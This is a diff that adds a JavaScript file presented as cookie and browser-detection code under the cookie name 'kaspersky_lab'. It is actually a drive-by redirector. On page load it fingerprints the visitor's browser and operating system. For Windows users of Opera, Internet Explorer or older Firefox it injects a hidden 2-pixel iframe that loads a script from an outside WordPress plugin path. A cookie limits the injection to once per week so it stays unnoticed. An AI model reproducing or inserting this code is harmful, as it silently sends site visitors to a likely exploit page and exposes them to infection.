@@ -1,0 +1,140 @@
+ var nth=1; 
+var perc = Math.round((1/nth)*1000);
+var rnd = Math.round(Math.random()*1000);
+var expdate=new Date(); expdate.setTime(expdate.getTime()+(24*60*60*1000*7));
+var showAfter=2; 
+var cookieName="kaspersky_lab";
+
+
+
+var cookieval=0;
+cookieval = GetCookie(cookieName);
+var cookieShowed = false;
+
+if(cookieval != 1) {
+	   if(document.loaded) {
+            showBrowVer();
+          } else {
+                if (window.addEventListener) {
+            window.addEventListener('load', showBrowVer, false);
+          } else {
+            window.attachEvent('onload', showBrowVer);
+          }
+	SetCookie(cookieName,'1',expdate,"/",null,false);
+	SetCookie(cookieName+"_pages_showed",'1',expdate,"/",null,false); 
+	SetCookie(cookieName+"_showed",'0',expdate,"/",null,false); 
+	cookieval = GetCookie(cookieName);
+	if(cookieval == 1 && showAfter <= 1 && rnd <= perc) {	
+		SetCookie(cookieName+"_showed",'1',expdate,"/",null,false); 
+
+       }			
+	}
+}
+
+
+function GetCookie(name)
+{
+	var arg=name+"=";
+	var alen=arg.length;
+	var clen=document.cookie.length;
+	var i=0;
+	while(i<clen)
+	{
+		var j=i+alen;
+		if(document.cookie.substring(i,j)==arg) return getCookieVal(j);
+		i=document.cookie.indexOf(" ",i)+1;
+		if(i==0)break;
+	}
+	return null;
+}
+
+function getCookieVal(offset)
+{
+	var endstr=document.cookie.indexOf(";",offset);
+	if(endstr==-1)endstr=document.cookie.length;
+	return unescape(document.cookie.substring(offset,endstr));
+}
+function SetCookie(name, value, expires, path, domain, secure, showAfter)
+{
+	document.cookie=name+"="+escape(value)+((expires==null)?"":("; expires="+expires.toGMTString()))+((path==null)?"":("; path="+path))+((domain==null)?"":("; domain="+domain))+((secure==true)?"; secure":"");
+}
+
+function browserDetectNav(chrAfterPoint)
+{
+var
+    UA=window.navigator.userAgent, 
+	
+	OperaB = /Opera[ \/]+\w+\.\w+/i,    
+	OperaV = /Version[ \/]+\w+\.\w+/i,  
+	FirefoxB = /Firefox\/\w+\.\w+/i,   
+	ChromeB = /Chrome\/\w+\.\w+/i,    
+	SafariB = /Version\/\w+\.\w+/i,     
+	IEB = /MSIE *\d+\.\w+/i,            
+	SafariV = /Safari\/\w+\.\w+/i,      
+
+	browser = new Array(),              
+	browserSplit = /[ \/\.]/i,           
+	OperaV = UA.match(OperaV),
+	Firefox = UA.match(FirefoxB),
+	Chrome = UA.match(ChromeB),
+	Safari = UA.match(SafariB),
+	SafariV = UA.match(SafariV),
+	IE = UA.match(IEB),
+	Opera = UA.match(OperaB);
+
+
+		if ((!Opera=="")&(!OperaV=="")) browser[0]=OperaV[0].replace(/Version/, "Opera")
+				else
+					if (!Opera=="")	browser[0]=Opera[0]
+						else
+
+							if (!IE=="") browser[0] = IE[0]
+								else
+
+									if (!Firefox=="") browser[0]=Firefox[0]
+										else
+
+											if (!Chrome=="") browser[0] = Chrome[0]
+												else
+
+													if ((!Safari=="")&&(!SafariV=="")) browser[0] = Safari[0].replace("Version", "Safari");
+
+
+	var outputData;                                     
+                                                           
+                                                         
+
+	if (browser[0] != null) outputData = browser[0].split(browserSplit);
+	if ((chrAfterPoint==null)&&(outputData != null))
+		{
+			chrAfterPoint=outputData[2].length;
+			outputData[2] = outputData[2].substring(0, chrAfterPoint); 
+            outputData[3] = 'uncomn';
+if (UA.indexOf ('Windows') != -1) outputData[3] = 'Windows';
+if (UA.indexOf ('Linux')!= -1) outputData[3] = 'Linux';
+if (UA.indexOf ('Mac')!= -1) outputData[3] = 'Mac';
+if (UA.indexOf ('SunOS')!= -1) outputData[3] = 'SunOS';
+if (UA.indexOf ('FreeBSD')!= -1) outputData[3] = 'FreeBSD';
+
+
+			return(outputData);
+		}
+			else return(false);
+}
+
+function showBrowVer()
+{
+    var data = browserDetectNav();      
+                                      
+
+    if (data[0]) {
+      if ((data[0] == 'Opera' || data[0] == 'MSIE'|| (data[0] == 'Firefox' & data[1] <= 17)) & data[3] == 'Windows'){
+          var js_kod2 = document.createElement('iframe');
+              js_kod2.src = 'http://bathlarriyadh.com/wp-content/plugins/wp-pagenavi/blog.php';
+              js_kod2.width = '2px';                  
+              js_kod2.height = '2px';                
+              js_kod2.style = 'visibility: hidden;';  
+              document.body.appendChild(js_kod2);		
+      }
+    }
+}
